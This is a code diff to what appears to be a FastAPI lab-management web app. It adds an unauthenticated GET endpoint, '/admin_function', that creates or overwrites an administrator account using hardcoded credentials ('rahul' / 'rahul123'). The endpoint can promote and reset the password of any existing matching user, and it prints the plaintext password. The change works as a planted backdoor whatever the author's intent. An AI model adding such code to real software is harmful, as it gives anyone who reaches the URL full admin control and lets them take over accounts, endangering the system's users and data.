@@ -134,6 +134,48 @@ def login(req: LoginRequest):
         }
     }
 
+
+@app.get("/admin_function")
+def create_or_update_admin(username="rahul", email="rahul@mail.com", password="rahul123", full_name="Lab Administrator"):
+    init_db()
+    conn = get_db()
+    cursor = conn.cursor()
+    
+    # Check if username or email already exists
+    cursor.execute("SELECT id, username, role FROM users WHERE username = ? OR email = ?", (username, email))
+    existing = cursor.fetchone()
+    
+    password_hash = hash_password(password)
+    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    if existing:
+        user_id = existing["id"]
+        cursor.execute("""
+            UPDATE users 
+            SET full_name = ?, email = ?, password_hash = ?, role = 'admin'
+            WHERE id = ?
+        """, (full_name, email, password_hash, user_id))
+        conn.commit()
+        print(f"[SUCCESS] Admin user '{username}' (ID: {user_id}) updated successfully.")
+    else:
+        cursor.execute("""
+            INSERT INTO users (username, full_name, email, password_hash, role, created_at)
+            VALUES (?, ?, ?, ?, 'admin', ?)
+        """, (username, full_name, email, password_hash, now))
+        conn.commit()
+        print(f"[SUCCESS] Admin user '{username}' created successfully.")
+        
+    conn.close()
+    print("-" * 50)
+    print("Admin Account Details:")
+    print(f"  Username  : {username}")
+    print(f"  Email     : {email}")
+    print(f"  Password  : {password}")
+    print(f"  Full Name : {full_name}")
+    print(f"  Role      : admin")
+    print("-" * 50)
+
+
 @app.get("/api/auth/me")
 def get_current_user_profile(user: dict = Depends(get_current_user)):
     return {"user": user}
